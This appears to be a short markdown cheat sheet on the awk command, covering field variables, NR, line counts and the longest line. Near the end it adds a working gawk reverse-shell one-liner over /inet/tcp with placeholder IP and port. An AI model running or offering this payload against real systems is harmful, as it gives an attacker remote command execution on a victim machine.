## awk
For each record i.e line, the awk command splits the record delimited by whitespace character by default and stores it in the $n variables. If the line has 4 words, it will be stored in $1, $2, $3 and $4 respectively. Also, $0 represents the whole line.

    awk '{print $1,$4}' text.txt
this is would print the first and fourth word of each line in text.txt

---
    awk '{print NR "- " $1 }' text.txt
NR is a built in variable and displays the number of what line
for example:
1 - firstLineOfText
2- SecondLineOfText
3 - ThirdLineofText

Examples of things you can do with awk:
---
print number of lines in a file

    awk 'END { print NR }' text.txt

find the length of the longest line present in the file

    awk '{ if (length($0) > max) max = length($0) } END { print max }' text.txt


awk isnt just limited to filtering out file content you can also standard programming things like printing out text

    awk 'BEGIN { print "Hello World!"}'

you can also get a reverse shell with awk

    awk 'BEGIN {s = "/inet/tcp/0/insertiphere/insertporthere"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null


---
there are several implementations of awk like gawk, nawk, mawk and probably more

for more advanced operations you can use sed 


